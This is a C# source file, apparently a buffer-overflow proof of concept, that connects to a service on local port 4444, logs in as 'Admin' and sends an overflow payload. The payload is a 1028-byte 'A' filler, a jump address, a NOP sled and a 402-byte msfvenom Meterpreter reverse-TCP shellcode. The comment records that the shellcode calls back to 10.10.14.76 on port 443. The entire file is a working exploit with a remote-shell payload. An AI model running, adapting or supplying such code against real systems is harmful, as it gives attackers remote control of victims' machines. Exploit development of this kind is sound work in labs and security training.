using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace BO_PoC
{
    class Program
    {
        static void Main(string[] args)
        {
            //Console.WriteLine(String.Concat(Enumerable.Repeat("A", 1500)));
            //return;
            // ---
            IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress ipAddr = IPAddress.Parse("127.0.0.1");
            IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 4444);

            Socket sender = new Socket(ipAddr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            try
            {
                byte[] messageReceived = new byte[1024];
                byte[] messageSent = Encoding.ASCII.GetBytes("Admin");

                sender.Connect(localEndPoint);
                Console.WriteLine("Socket connected to -> {0} ", sender.RemoteEndPoint.ToString());

                
                int byteRecv = sender.Receive(messageReceived);
                Console.WriteLine("Message from Server -> {0}", Encoding.ASCII.GetString(messageReceived, 0, byteRecv));

                
                int byteSent = sender.Send(messageSent);
                byteRecv = sender.Receive(messageReceived);
                Console.WriteLine("Message from Server -> {0}", Encoding.ASCII.GetString(messageReceived, 0, byteRecv));

                //messageSent = Encoding.ASCII.GetBytes("P@$$worD");

                byte[] crash = Encoding.ASCII.GetBytes(String.Concat(Enumerable.Repeat("A", 1028)));
                byte[] jmp = new byte[4] { 0xC5, 0x3F, 0x4A, 0x10 };
                byte[] nops = new byte[20] { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
                // msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.76 lport=443 EXITFUNC=process -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai -f csharp
                byte[] sc = new byte[402] {
                    0xb8,0xe3,0x23,0xb5,0xc4,0xd9,0xc8,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,
                    0x5e,0x31,0x47,0x15,0x83,0xef,0xfc,0x03,0x47,0x11,0xe2,0x16,0xdf,0x5d,0x4b,
                    0xd8,0x20,0x9e,0x34,0x51,0xc5,0xaf,0x66,0x05,0x8d,0x82,0xb6,0x4e,0xc3,0x2e,
                    0x3c,0x02,0xf0,0xa5,0x30,0x8a,0xc9,0x46,0xbb,0x7d,0x63,0x9f,0xf5,0x41,0xd8,
                    0xe3,0x94,0x3d,0x23,0x30,0x77,0x7c,0xec,0x45,0x76,0xb9,0xba,0x20,0x97,0x17,
                    0xb6,0x99,0x77,0xc0,0x43,0x5f,0x44,0xef,0x83,0xeb,0xf4,0x97,0xa6,0x2c,0x80,
                    0x2b,0xa8,0x7c,0x39,0x38,0xf2,0x5c,0x31,0x76,0x1b,0x9c,0x96,0x03,0xd2,0xea,
                    0x24,0x42,0xd4,0xed,0xde,0x60,0x9d,0x13,0x37,0xb9,0x61,0xbf,0x76,0x76,0x6c,
                    0xc1,0xbf,0xb0,0x8f,0xb4,0xcb,0xc3,0x32,0xcf,0x0f,0xbe,0xe8,0x5a,0x90,0x18,
                    0x7a,0xfc,0x74,0x99,0xaf,0x9b,0xff,0x95,0x04,0xef,0x58,0xb9,0x9b,0x3c,0xd3,
                    0xc5,0x10,0xc3,0x34,0x4c,0x62,0xe0,0x90,0x15,0x30,0x89,0x81,0xf3,0x97,0xb6,
                    0xd2,0x5b,0x47,0x13,0x98,0x49,0x9e,0x23,0x61,0x92,0x9f,0x79,0xf6,0x5f,0x52,
                    0x82,0x06,0xf7,0xe5,0xf1,0x34,0x58,0x5e,0x9e,0x74,0x11,0x78,0x59,0x0c,0x35,
                    0x7b,0xb5,0xb6,0x55,0x85,0x36,0xc7,0x7c,0x42,0x62,0x97,0x16,0x63,0x0b,0x7c,
                    0xe6,0x8c,0xde,0xe9,0xec,0x1a,0xeb,0xe7,0xfe,0xe8,0x83,0xf5,0xfe,0x0d,0xef,
                    0x73,0x18,0x5d,0x5f,0xd4,0xb4,0x1e,0x0f,0x94,0x64,0xf7,0x45,0x1b,0x5b,0xe7,
                    0x65,0xf1,0xf4,0x82,0x89,0xac,0xad,0x3a,0x33,0xf5,0x25,0xda,0xbc,0x23,0x40,
                    0xdc,0x37,0xc6,0xb5,0x93,0xbf,0xa3,0xa5,0xc4,0xa7,0x4b,0x35,0x15,0x42,0x4c,
                    0x5f,0x11,0xc4,0x1b,0xf7,0x1b,0x31,0x6b,0x58,0xe3,0x14,0xef,0x9e,0x1b,0xe9,
                    0xc6,0xd5,0x2a,0x7f,0x67,0x81,0x52,0x6f,0x67,0x51,0x05,0xe5,0x67,0x39,0xf1,
                    0x5d,0x34,0x5c,0xfe,0x4b,0x28,0xcd,0x6b,0x74,0x19,0xa2,0x3c,0x1c,0xa7,0x9d,
                    0x0b,0x83,0x58,0xc8,0x0f,0xc4,0xa7,0x8f,0x27,0x6d,0xc0,0x6f,0x78,0x8d,0x10,
                    0x05,0x78,0xdd,0x78,0xd2,0x57,0xd2,0x48,0x1b,0x72,0xbb,0xc0,0x96,0x13,0x09,
                    0x70,0xa7,0x39,0xcf,0x2c,0xa8,0xce,0xd4,0xdf,0xd3,0xbf,0xeb,0x1f,0x24,0xd6,
                    0x8f,0x1f,0x25,0xd6,0xb1,0x1c,0xf0,0xef,0xc7,0x63,0xc1,0x4b,0xc7,0x79,0xef,
                    0xa1,0x60,0x24,0x7a,0x08,0xed,0xd7,0x51,0x4f,0x08,0x54,0x53,0x30,0xef,0x44,
                    0x16,0x35,0xab,0xc2,0xcb,0x47,0xa4,0xa6,0xeb,0xf4,0xc5,0xe2 };
                int sz_fill = 1500 - crash.Length - jmp.Length - nops.Length - sc.Length;
                byte[] fill = Encoding.ASCII.GetBytes(String.Concat(Enumerable.Repeat("C", sz_fill)));

                byte[] buf = crash.Concat(jmp).Concat(nops).Concat(sc).Concat(fill).ToArray();

                Console.WriteLine("buf.Length: " + buf.Length);

                // Encoding.ASCII.GetBytes(String.Concat(Enumerable.Repeat("A", 1500)))
                messageSent = buf;
                byteSent = sender.Send(messageSent);
                byteRecv = sender.Receive(messageReceived);
                Console.WriteLine("Message from Server -> {0}", Encoding.ASCII.GetString(messageReceived, 0, byteRecv));

            }
            catch (ArgumentNullException ane)
            {

                Console.WriteLine("ArgumentNullException : {0}", ane.ToString());
            }

            catch (SocketException se)
            {

                Console.WriteLine("SocketException : {0}", se.ToString());
            }

            catch (Exception e)
            {
                Console.WriteLine("Unexpected exception : {0}", e.ToString());
            }
        }
    }
}
